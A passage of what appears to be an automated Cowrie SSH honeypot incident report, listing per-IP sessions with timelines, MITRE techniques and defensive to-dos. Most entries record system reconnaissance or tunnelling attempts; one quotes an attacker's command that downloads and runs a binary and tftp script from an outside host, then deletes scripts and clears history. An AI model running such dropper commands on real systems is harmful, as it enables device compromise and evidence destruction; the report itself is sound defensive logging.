| `2026-07-26 10:46:55` | `cowrie.client.version` |
| `2026-07-26 10:46:55` | `cowrie.client.kex` |
| `2026-07-26 10:46:57` | `cowrie.login.success` |
| `2026-07-26 10:46:57` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a3ab8d7e8e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:49 |
| **Last Seen** | 2026-07-26 10:49 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:49:13` | `cowrie.session.connect` |
| `2026-07-26 10:49:14` | `cowrie.client.version` |
| `2026-07-26 10:49:14` | `cowrie.client.kex` |
| `2026-07-26 10:49:22` | `cowrie.login.success` |
| `2026-07-26 10:49:24` | `cowrie.session.params` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.success` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:24` | `cowrie.command.input` |
| `2026-07-26 10:49:27` | `cowrie.log.closed` |
| `2026-07-26 10:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a12b6ad4da

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-26 10:50 |
| **Last Seen** | 2026-07-26 10:50 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:50:07` | `cowrie.session.connect` |
| `2026-07-26 10:50:09` | `cowrie.client.version` |
| `2026-07-26 10:50:09` | `cowrie.client.kex` |
| `2026-07-26 10:50:11` | `cowrie.login.success` |
| `2026-07-26 10:50:14` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aacce005c87

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-07-26 10:50 |
| **Last Seen** | 2026-07-26 10:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:50:24` | `cowrie.session.connect` |
| `2026-07-26 10:50:24` | `cowrie.client.version` |
| `2026-07-26 10:50:24` | `cowrie.client.kex` |
| `2026-07-26 10:50:25` | `cowrie.login.success` |
| `2026-07-26 10:50:26` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd2800011d4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:52 |
| **Last Seen** | 2026-07-26 10:52 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:52:08` | `cowrie.session.connect` |
| `2026-07-26 10:52:09` | `cowrie.client.version` |
| `2026-07-26 10:52:13` | `cowrie.client.kex` |
| `2026-07-26 10:52:16` | `cowrie.login.success` |
| `2026-07-26 10:52:20` | `cowrie.session.params` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.success` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:20` | `cowrie.command.input` |
| `2026-07-26 10:52:21` | `cowrie.command.input` |
| `2026-07-26 10:52:22` | `cowrie.log.closed` |
| `2026-07-26 10:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef5a0008f391

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:54 |
| **Last Seen** | 2026-07-26 10:55 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:54:56` | `cowrie.session.connect` |
| `2026-07-26 10:54:58` | `cowrie.client.version` |
| `2026-07-26 10:54:58` | `cowrie.client.kex` |
| `2026-07-26 10:55:05` | `cowrie.login.success` |
| `2026-07-26 10:55:09` | `cowrie.session.params` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.success` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:09` | `cowrie.command.input` |
| `2026-07-26 10:55:11` | `cowrie.log.closed` |
| `2026-07-26 10:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ebec3716ac

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:57 |
| **Last Seen** | 2026-07-26 10:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:57:42` | `cowrie.session.connect` |
| `2026-07-26 10:57:43` | `cowrie.client.version` |
| `2026-07-26 10:57:45` | `cowrie.client.kex` |
| `2026-07-26 10:57:47` | `cowrie.login.success` |
| `2026-07-26 10:57:51` | `cowrie.session.params` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.success` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:51` | `cowrie.command.input` |
| `2026-07-26 10:57:53` | `cowrie.log.closed` |
| `2026-07-26 10:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4a63bf5615

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 11:00 |
| **Last Seen** | 2026-07-26 11:00 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:00:15` | `cowrie.session.connect` |
| `2026-07-26 11:00:16` | `cowrie.client.version` |
| `2026-07-26 11:00:16` | `cowrie.client.kex` |
| `2026-07-26 11:00:21` | `cowrie.login.success` |
| `2026-07-26 11:00:27` | `cowrie.session.params` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.success` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:27` | `cowrie.command.input` |
| `2026-07-26 11:00:28` | `cowrie.log.closed` |
| `2026-07-26 11:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30892b364c5

| Field | Detail |
|---|---|
| **Source IP** | `111.36.57[.]69` |
| **First Seen** | 2026-07-26 11:00 |
| **Last Seen** | 2026-07-26 11:01 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:00:39` | `cowrie.session.connect` |
| `2026-07-26 11:00:39` | `cowrie.client.version` |
| `2026-07-26 11:01:40` | `cowrie.client.kex` |
| `2026-07-26 11:01:41` | `cowrie.login.success` |
| `2026-07-26 11:01:43` | `cowrie.session.params` |
| `2026-07-26 11:01:43` | `cowrie.command.input` |
| `2026-07-26 11:01:46` | `cowrie.log.closed` |
| `2026-07-26 11:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.36.57[.]69` to AbuseIPDB if not already reported
- [ ] Block `111.36.57[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3ea153d093

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 11:02 |
| **Last Seen** | 2026-07-26 11:02 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:02:41` | `cowrie.session.connect` |
| `2026-07-26 11:02:43` | `cowrie.client.version` |
| `2026-07-26 11:02:44` | `cowrie.client.kex` |
| `2026-07-26 11:02:48` | `cowrie.login.success` |
| `2026-07-26 11:02:51` | `cowrie.session.params` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.success` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:51` | `cowrie.command.input` |
| `2026-07-26 11:02:54` | `cowrie.log.closed` |
| `2026-07-26 11:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20795221c551

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-07-26 11:03 |
| **Last Seen** | 2026-07-26 11:03 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:03:05` | `cowrie.session.connect` |
| `2026-07-26 11:03:07` | `cowrie.client.version` |
| `2026-07-26 11:03:07` | `cowrie.client.kex` |
| `2026-07-26 11:03:13` | `cowrie.login.success` |
| `2026-07-26 11:03:15` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09846cde13fb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 11:05 |
| **Last Seen** | 2026-07-26 11:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:05:15` | `cowrie.session.connect` |
| `2026-07-26 11:05:16` | `cowrie.client.version` |
| `2026-07-26 11:05:16` | `cowrie.client.kex` |
| `2026-07-26 11:05:20` | `cowrie.login.success` |
| `2026-07-26 11:05:23` | `cowrie.session.params` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.success` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:23` | `cowrie.command.input` |
| `2026-07-26 11:05:24` | `cowrie.log.closed` |
| `2026-07-26 11:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8581f3a416f0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-26 11:07 |
| **Last Seen** | 2026-07-26 11:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.69[.]141/armv7l; chmod +x; armv7l; tftp -g 83.168.69[.]141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.69[.]141/armv7l |
| **Malware Analysis** | 40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:07:04` | `cowrie.session.connect` |
| `2026-07-26 11:07:04` | `cowrie.login.success` |
| `2026-07-26 11:07:04` | `cowrie.session.params` |
| `2026-07-26 11:07:06` | `cowrie.command.input` |
| `2026-07-26 11:07:06` | `cowrie.command.input` |
| `2026-07-26 11:07:06` | `cowrie.session.file_download` |
| `2026-07-26 11:07:21` | `cowrie.log.closed` |
| `2026-07-26 11:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85d17c7d5be

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 11:07 |
| **Last Seen** | 2026-07-26 11:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:07:41` | `cowrie.session.connect` |
| `2026-07-26 11:07:43` | `cowrie.client.version` |
| `2026-07-26 11:07:43` | `cowrie.client.kex` |
| `2026-07-26 11:07:49` | `cowrie.login.success` |
| `2026-07-26 11:07:51` | `cowrie.session.params` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.success` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:51` | `cowrie.command.input` |
| `2026-07-26 11:07:52` | `cowrie.log.closed` |
| `2026-07-26 11:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dbf8fea3039

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-26 11:10 |
| **Last Seen** | 2026-07-26 11:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:10:07` | `cowrie.session.connect` |
| `2026-07-26 11:10:07` | `cowrie.client.version` |
| `2026-07-26 11:10:07` | `cowrie.client.kex` |
| `2026-07-26 11:10:10` | `cowrie.login.success` |
| `2026-07-26 11:10:10` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfea86827673

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-07-26 11:11 |
| **Last Seen** | 2026-07-26 11:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:11:30` | `cowrie.session.connect` |
| `2026-07-26 11:11:31` | `cowrie.client.version` |
| `2026-07-26 11:11:31` | `cowrie.client.kex` |
| `2026-07-26 11:11:33` | `cowrie.login.success` |
| `2026-07-26 11:11:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2106b11e38b2

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-26 11:11 |
| **Last Seen** | 2026-07-26 11:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:11:38` | `cowrie.session.connect` |
| `2026-07-26 11:11:39` | `cowrie.client.version` |
| `2026-07-26 11:11:39` | `cowrie.client.kex` |
| `2026-07-26 11:11:41` | `cowrie.login.success` |
| `2026-07-26 11:11:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
